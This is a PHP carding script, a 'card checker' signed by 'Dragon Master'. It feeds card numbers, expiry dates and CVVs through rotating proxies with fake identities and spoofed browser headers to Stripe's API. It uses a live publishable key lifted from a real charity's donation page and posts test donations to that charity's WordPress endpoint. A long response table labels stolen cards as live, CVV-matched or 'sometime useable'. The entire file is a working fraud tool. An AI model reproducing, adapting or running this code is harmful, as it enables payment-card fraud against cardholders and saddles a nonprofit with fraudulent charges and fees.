<?php

############DRAGON-MSETER]##########
############[PHP SETUP]#############

          error_reporting(0);
          set_time_limit(0);
          error_reporting(0);
          date_default_timezone_set('America/Buenos_Aires');

 

#########################[Functions + Lista]############################

          function multiexplode($delimiters, $string){
                  $one = str_replace($delimiters, $delimiters[0], $string);
                  $two = explode($delimiters[0], $one);
          return $two;}

                  $lista = $_GET['lista'];
                  $cc   = multiexplode(array(":", "|", " "), $lista)[0];
                  $mes  = multiexplode(array(":", "|", " "), $lista)[1];
                  $ano = multiexplode(array(":", "|", " "), $lista)[2];
                  $cvv  = multiexplode(array(":", "|", " "), $lista)[3];
          function GetStr($string, $start, $end){
                  $str = explode($start, $string);
                  $str = explode($end, $str[1]);
          return $str[0];}

                  $amount = 'Charge : $'.rand(3,7).'.'.rand(01,99);
                  $amount2 = 'Not Charged';

                  $MADEBY = "<a href='tg://user?id=1832970939'>[ 🇮🇳 ] Dragon Master</a>"; /// PUT YOUR NAME

          function value($str,$find_start,$find_end){
                  $start = @strpos($str,$find_start);
          if ($start === false){
          return "";}
                  $length = strlen($find_start);
                  $end    = strpos(substr($str,$start +$length),$find_end);
          return trim(substr($str,$start +$length,$end));}
          function mod($dividendo,$divisor){
          return round($dividendo - (floor($dividendo/$divisor)*$divisor));}

          function AllinOne($data = 42){
                return substr(strtolower(sprintf('%04X%04X-%04X-%04X-%04X-%04X%04X%04X%04X%04X', mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(16384, 20479), mt_rand(32768, 49151), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535), mt_rand(1, 65535))), 0, $data);};
           

#####################################

                  $guid = AllinOne();
                  $muid = AllinOne();
                  $sid = AllinOne();

#####################################
                  $time_on_page  = ucfirst(str_shuffle('67818'));
                  $z1  = substr($cc,0,3);
                  $z2  = substr($cc,3,6);
#########################[BIN LOOK-UP]############################

          $ch = curl_init();
          curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
          curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
          curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                'Host: lookup.binlist.net',
                'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_POSTFIELDS, '');
                $fim = curl_exec($ch); 
                $emoji = GetStr($fim, '"emoji":"', '"'); 
                if(strpos($fim, '"type":"credit"') !== false){
                }
                curl_close($ch);

#########################

          $ch = curl_init();
          $bin = substr($cc, 0,6);
          curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  $bindata = curl_exec($ch);
                  $binna = json_decode($bindata,true);
                  $brand = $binna['scheme'];
                  $country = $binna['country']['name'];
                  $type = $binna['type'];
                  $bank = $binna['bank']['name'];
                  curl_close($ch);

                  $bindata1 = " $type - $brand - $country $emoji"; ///CREDIT - MASTERCARD - UNITED STATES 🇺🇸

#########################[Randomizing Details]############################

        $get = file_get_contents('https://randomuser.me/api/1.2/?nat='.$country.'');
        preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
        $first = $matches1[1][0];
        preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
        $last = $matches1[1][0];
        preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
        $email = $matches1[1][0];
        $serve_arr = array("gmail.com","homtail.com","yahoo.com.br","outlook.com");
        $serv_rnd = $serve_arr[array_rand($serve_arr)];
        $email= str_replace("example.com", $serv_rnd, $email);
        preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
        $street = $matches1[1][0];
        preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
        $city = $matches1[1][0];
        preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
        $state = $matches1[1][0];
        preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
        $phone = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $postcode = $matches1[1][0];
        preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
        $zip = $matches1[1][0];

######################[Proxys]######################
$rp1 = array(
  1 => 'USER:PASS', /// [ex :- igapfgvg-rotate:4spo27fv5idh]
  2 => 'USER:PASS',
  3 => 'USER:PASS',
  4 => 'USER:PASS',
  5 => 'USER:PASS',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];

$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "Proxy live ✅";
}
if (empty($ip1)){
$ip = "Proxy Dead ❌ :[".$rotate."]";
}

 echo '[ IP: '.$ip.' ] ';

//######################[Proxys END]######################//


#########################[1 REQ]############################


        $ch = curl_init();
     
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/payment_methods',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://js.stripe.com',
               'referer: https://js.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$zip.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=28bc5cc8-ae20-4f48-bb54-58b237b03bb74177ed&muid=588900f9-7366-43cc-a13d-15b76bf5710cb62953&sid=bfe2b8c0-6246-441e-a080-ad9fd56e583f75d6a0&pasted_fields=number&payment_user_agent=stripe.js%2F327390af5%3B+stripe-js-v3%2F327390af5&time_on_page=45620&key=pk_live_QMBU860cL1m4otZJNXjcDFyq');

         $r1 = curl_exec($ch);


         $token1 = trim(strip_tags(getstr($r1,'"pm','"')));


         #########################[2 REQ]############################


        $ch = curl_init();
     
        curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: api.stripe.com',
               'method: POST',
               'path: /v1/tokens',
               'scheme: https',
               'accept: application/json',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded',
               'origin: https://js.stripe.com',
               'referer: https://js.stripe.com/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$zip.'&guid=28bc5cc8-ae20-4f48-bb54-58b237b03bb74177ed&muid=588900f9-7366-43cc-a13d-15b76bf5710cb62953&sid=bfe2b8c0-6246-441e-a080-ad9fd56e583f75d6a0&payment_user_agent=stripe.js%2F327390af5%3B+stripe-js-v3%2F327390af5&time_on_page='.rand(10000,99999).'&key=pk_live_QMBU860cL1m4otZJNXjcDFyq&pasted_fields=number');

         $r3 = curl_exec($ch);
         $toke21 = trim(strip_tags(getstr($r3,'tok','"')));
         
#########################[3 REQ]############################


        $ch = curl_init();
        
        curl_setopt($ch, CURLOPT_URL, 'https://hopeinlancaster.org/wp-admin/admin-ajax.php');
        curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
               'authority: hopeinlancaster.org',
               'method: POST',
               'path: /wp-admin/admin-ajax.php',
               'scheme: https',
               'accept: */*',
               'accept-language: en-US,en;q=0.9',
               'content-type: application/x-www-form-urlencoded; charset=UTF-8',
               'cookie: __stripe_mid=588900f9-7366-43cc-a13d-15b76bf5710cb62953; __stripe_sid=bfe2b8c0-6246-441e-a080-ad9fd56e583f75d6a0',
               'origin: https://hopeinlancaster.org',
               'referer: https://hopeinlancaster.org/donations/',
               'sec-fetch-dest: empty',
               'sec-fetch-mode: cors',
               'sec-fetch-site: same-origin',
               'sec-gpc: 1',
               'user-agent: Mozilla/5.0 (Windows NT '.rand(11,99).'.0; Win64; x64) AppleWebKit/'.rand(111,999).'.'.rand(11,99).' (KHTML, like Gecko) Chrome/'.rand(11,99).'.0.'.rand(1111,9999).'.'.rand(111,999).' Safari/'.rand(111,999).'.'.rand(11,99).'',));
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken=tok'.$toke21.'&paymentMethodID=pm'.$token1.'&allData%5BbillingDetails%5D%5Bemail%5D=svsdhvj%40Gmail.com&type=subscription&amount=cGxhbl9GUm55cEZ2aWpaUTdyRA%3D%3D&params%5Bvalue%5D=ds1563297406701&params%5Bname%5D=HOPE+In+Lancaster%2C+Inc&params%5Bamount%5D=cGxhbl9GUm55cEZ2aWpaUTdyRA%3D%3D&params%5Bdescription%5D=%2410+Monthly+Donation&params%5Bpanellabel%5D=Confirm+Payment&params%5Btype%5D=subscription&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=USD&params%5Blocale%5D=auto&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=ds1563297406701&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_QMBU860cL1m4otZJNXjcDFyq&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fhopeinlancaster.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fwww.hopeinlancaster.org%2Fwp-content%2Fuploads%2F2016%2F03%2FHOPE-LOGO.png&params%5Binstance%5D=ds1563297406701&params%5Bds_nonce%5D=9fae1c687e&ds_nonce=9fae1c687e');

         $r2 = curl_exec($ch);

#########################[Responses]############################
///// [1REQ - RSOP]

if(strpos($r1, '"seller_message": "Payment complete."' )) {
  $status = '#CVV';
  $cc_code = '『 CHARGE PASS✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,'"cvc_check": "pass",')){
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "Thank You For Donation." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "Thank You." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,'"status": "succeeded"')){
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Your card zip code is incorrect.' )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "incorrect_zip" )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "Success" )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "succeeded." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "insufficient_funds")) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'security code is incorrect.' )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "Your card's security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "Your card's security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'security code is invalid.' )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,"fraudulent")){
  $status = '#CVV';
  $cc_code = '『 FRAUDULENT CARD - Sometime Useable 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,"fraudulent",)){
  $status = '#CVV';
  $cc_code = '『 FRAUDULENT CARD - Sometime Useable 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "lost_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Lost_Card 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "stolen_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Stolen_Card 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Your card has expired.')) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "expired_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Your card has expired.')) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "expired_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
}

elseif(strpos($r1, 'Your card number is incorrect.')) {
  $status = 'Dead❌';
  $cc_code = '『 Incorrect Card Number 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "incorrect_number")) {
  $status = 'Dead❌';
  $cc_code = '『 Incorrect Card Number 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "do_not_honor")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Do_Not_Honor 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,'"cvc_check": "unavailable"')){
  $status = 'Dead❌';
  $cc_code = '『  Security Code Check : Unavailable [Proxy Dead/change IP] 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,'"cvc_check": "fail"')){
  $status = 'Dead❌';
  $cc_code = '『  Security Code Check : Unavailable [Proxy Dead/change IP] 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,"parameter_invalid_empty")){
  $status = 'Dead❌';
  $cc_code = '『 Declined : Missing Card Details 』';
  $reqfind = '1 Req';
}

elseif (strpos($r1,'Your card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '1 Req';
}

elseif (strpos($r1,'Your card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,"transaction_not_allowed")){
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,"three_d_secure_redirect")){
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, 'Card is declined by your bank, please contact them for additional information.')) {
  $status = 'Dead❌';
  $cc_code = '『 3D Secure Redirect 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1,"missing_payment_information")){
  $status = 'Dead❌';
  $cc_code = '『 Missing Payment Information 』';
  $reqfind = '1 Req';
}

elseif(strpos($r1, "Payment cannot be processed, missing credit card number")) {
  $status = 'Dead❌';
  $cc_code = '『 Missing Credit Card Number 』';
  $reqfind = '1 Req';
}


///// [2REQ - RSOP]
elseif(strpos($r2, '"seller_message": "Payment complete."' )) {
  $status = '#CVV';
  $cc_code = '『 CHARGE PASS✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'"cvc_check": "pass",')){
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "Thank You For Donation." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "Thank You." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'"status": "succeeded"')){
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Your card zip code is incorrect.' )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "incorrect_zip" )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "Success" )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "succeeded." )) {
  $status = '#CVV';
  $cc_code = '『 CVV MATCH ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Your card has Insufficient Funds ✅.')) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "insufficient_funds")) {
  $status = '#CVV';
  $cc_code = '『 Insufficient Funds ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'security code is incorrect.' )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "Your card's security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "Your card's security code is incorrect." )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'security code is invalid.' )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "incorrect_cvc" )) {
  $status = '#CCN';
  $cc_code = '『 CCN LIVE ✅ 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,"fraudulent")){
  $status = '#CVV';
  $cc_code = '『 FRAUDULENT CARD - Sometime Useable 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,"fraudulent",)){
  $status = '#CVV';
  $cc_code = '『 FRAUDULENT CARD - Sometime Useable 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "lost_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Lost_Card 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "stolen_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Stolen_Card 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Your card has expired.')) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "expired_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "pickup_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Pickup Card (Reported Stolen Or Lost 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Your card has expired.')) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "expired_card" )) {
  $status = 'Dead❌';
  $cc_code = '『 Expired Card 』';
}

elseif(strpos($r2, 'Your card number is incorrect.')) {
  $status = 'Dead❌';
  $cc_code = '『 Incorrect Card Number 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "incorrect_number")) {
  $status = 'Dead❌';
  $cc_code = '『 Incorrect Card Number 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "do_not_honor")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Do_Not_Honor 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "generic_decline")) {
  $status = 'Dead❌';
  $cc_code = '『 Declined : Generic_Decline 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Your card was declined.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Declined 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'"cvc_check": "unavailable"')){
  $status = 'Dead❌';
  $cc_code = '『  Security Code Check : Unavailable [Proxy Dead/change IP] 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,'"cvc_check": "fail"')){
  $status = 'Dead❌';
  $cc_code = '『  Security Code Check : Unavailable [Proxy Dead/change IP] 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,"parameter_invalid_empty")){
  $status = 'Dead❌';
  $cc_code = '『 Declined : Missing Card Details 』';
  $reqfind = '2 Req';
}

elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '2 Req';
}

elseif (strpos($r2,'Your card does not support this type of purchase.')) {
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,"transaction_not_allowed")){
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,"three_d_secure_redirect")){
  $status = 'Dead❌';
  $cc_code = '『 Card Doesnt Support Purchase 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, 'Card is declined by your bank, please contact them for additional information.')) {
  $status = 'Dead❌';
  $cc_code = '『 3D Secure Redirect 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2,"missing_payment_information")){
  $status = 'Dead❌';
  $cc_code = '『 Missing Payment Information 』';
  $reqfind = '2 Req';
}

elseif(strpos($r2, "Payment cannot be processed, missing credit card number")) {
  $status = 'Dead❌';
  $cc_code = '『 Missing Credit Card Number 』';
  $reqfind = '2 Req';
}
else {
  $status = 'Dead❌';
  $cc_code = '『 Dead Proxy/Error Not listed 』';
  $reqfind = '1 & 2 Req';
}

//=======================[Responses-END]==============================//

    echo '</br>'.$MADEBY.' ['.$status.'] '.$lista.''.$cc_code.'Request By :- '.$reqfind.' [STRIPE] </br>';


curl_close($ch);
ob_flush();


echo "<b>2REQ Result:</b> $r2<br><br>";



############DRAGON-MSETER]##########

?> 